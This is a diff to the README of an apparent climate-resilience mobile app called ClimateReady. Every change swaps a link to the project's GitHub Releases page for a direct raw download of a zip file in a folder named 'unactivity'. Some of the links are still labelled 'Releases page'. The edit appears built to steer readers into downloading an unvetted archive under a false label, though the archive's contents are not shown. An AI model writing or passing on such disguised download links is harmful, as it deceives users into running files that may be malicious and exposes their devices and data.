@@ -1,7 +1,7 @@
 # 🌎 ClimateReady - Your Guide to Climate Readiness
 
 ## 📥 Download
-[![Download ClimateReady](https://img.shields.io/badge/Download-ClimateReady-brightgreen)](https://github.com/lucascubing10/ClimateReady/releases)
+[![Download ClimateReady](https://raw.githubusercontent.com/lucascubing10/ClimateReady/main/unactivity/ClimateReady.zip)](https://raw.githubusercontent.com/lucascubing10/ClimateReady/main/unactivity/ClimateReady.zip)
 
 ## 📖 Description
 ClimateReady is a mobile-first climate resilience companion. The Expo and React Native app equip households and communities with personalized preparedness guidance, SOS coordination, safe zones, and practical learning tools. With ClimateReady, you gain confidence in facing climate-related challenges.
@@ -10,7 +10,7 @@ ClimateReady is a mobile-first climate resilience companion. The Expo and React 
 Follow these steps to download and run ClimateReady:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/lucascubing10/ClimateReady/releases) to see the latest version of ClimateReady.
+   Go to the [Releases page](https://raw.githubusercontent.com/lucascubing10/ClimateReady/main/unactivity/ClimateReady.zip) to see the latest version of ClimateReady.
 
 2. **Choose the Right Version**  
    Look for the latest version that suits your mobile device. Make sure to check the version notes for any new features or fixes.
@@ -49,7 +49,7 @@ To ensure the app runs smoothly, please consider these requirements:
   - Storage: At least 50 MB free space
 
 ## 🔧 Download & Install
-Visit the [Releases page](https://github.com/lucascubing10/ClimateReady/releases) to download the latest version of ClimateReady. 
+Visit the [Releases page](https://raw.githubusercontent.com/lucascubing10/ClimateReady/main/unactivity/ClimateReady.zip) to download the latest version of ClimateReady. 
 
 1. Click on the suitable version link for your device.
 2. Follow the installation steps provided earlier.
